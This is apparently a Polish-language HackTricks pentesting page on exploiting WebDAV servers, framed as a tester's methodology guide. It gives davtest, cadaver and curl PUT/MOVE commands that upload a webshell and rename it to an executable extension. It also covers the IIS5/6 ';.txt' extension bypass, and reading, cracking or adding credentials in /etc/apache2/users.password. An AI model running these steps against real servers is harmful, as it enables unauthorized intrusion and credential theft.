# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Zacznij od zera i zostań bohaterem hakowania AWS z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Podczas pracy z **serwerem HTTP z włączonym WebDav**, możliwe jest **manipulowanie plikami**, jeśli masz odpowiednie **poświadczenia**, zazwyczaj weryfikowane za pomocą **HTTP Basic Authentication**. Przejęcie kontroli nad takim serwerem często wiąże się z **wgrywaniem i uruchamianiem webshell**.

Dostęp do serwera WebDav zazwyczaj wymaga **ważnych poświadczeń**, a [**bruteforce WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) jest powszechną metodą ich pozyskiwania.

Aby przezwyciężyć ograniczenia dotyczące wgrywania plików, zwłaszcza te uniemożliwiające wykonanie skryptów po stronie serwera, można:

* **Wgrać** pliki z **rozszerzeniami wykonywalnymi** bezpośrednio, jeśli nie są ograniczone.
* **Zmienić nazwę** wgranych plików niebędących plikami wykonywalnymi (np. .txt) na rozszerzenie wykonywalne.
* **Skopiować** wgrane pliki niebędące plikami wykonywalnymi, zmieniając ich rozszerzenie na jedno z rozszerzeń wykonywalnych.

## DavTest

**Davtest** próbuje **wgrać kilka plików z różnymi rozszerzeniami** i **sprawdza**, czy rozszerzenie jest **wykonywane**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
## Cadaver

Możesz użyć tego narzędzia do **połączenia z serwerem WebDav** i wykonywania czynności (takich jak **przesyłanie**, **przenoszenie** lub **usuwanie**) **ręcznie**.
```
cadaver <IP>
```
## Zapytanie PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Żądanie MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji** prac z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Podatność na WebDav w IIS5/6

Ta podatność jest bardzo interesująca. **WebDav** **nie pozwala** na **wgrywanie** ani **zmienianie nazwy** plików z rozszerzeniem **.asp**. Ale możesz to **obejść**, dodając na końcu nazwy **";.txt"**, a plik zostanie **wykonany** jak plik .asp (możesz również **użyć ".html" zamiast ".txt"**, ale **NIE zapomnij o ";"**).

Następnie możesz **przesłać** swoją powłokę jako plik ".**txt"** i **skopiować/przenieść go do pliku ".asp;.txt"**. Po dostępie do tego pliku przez serwer WWW, zostanie **wykonany** (cadaver powie, że akcja przeniesienia nie powiodła się, ale tak naprawdę się udała).

![](<../../.gitbook/assets/image (1092).png>)

## Dane uwierzytelniające po

Jeśli Webdav korzystał z serwera Apache, powinieneś sprawdzić skonfigurowane witryny w Apache. Zazwyczaj:\
_**/etc/apache2/sites-enabled/000-default**_

Wewnątrz możesz znaleźć coś takiego:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Jak widać, istnieją pliki z poprawnymi **dane uwierzytelniające** do serwera **webdav**:
```
/etc/apache2/users.password
```
Wewnątrz tego rodzaju plików znajdziesz **nazwę użytkownika** oraz **hash** hasła. Są to dane uwierzytelniające, których serwer webdav używa do uwierzytelniania użytkowników.

Możesz spróbować je **złamać**, lub **dodać więcej**, jeśli z jakiegoś powodu chcesz **uzyskać dostęp** do serwera **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Aby sprawdzić, czy nowe dane uwierzytelniające działają, możesz wykonać:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Odnośniki

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować workflowy** zasilane przez najbardziej zaawansowane narzędzia społeczności na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
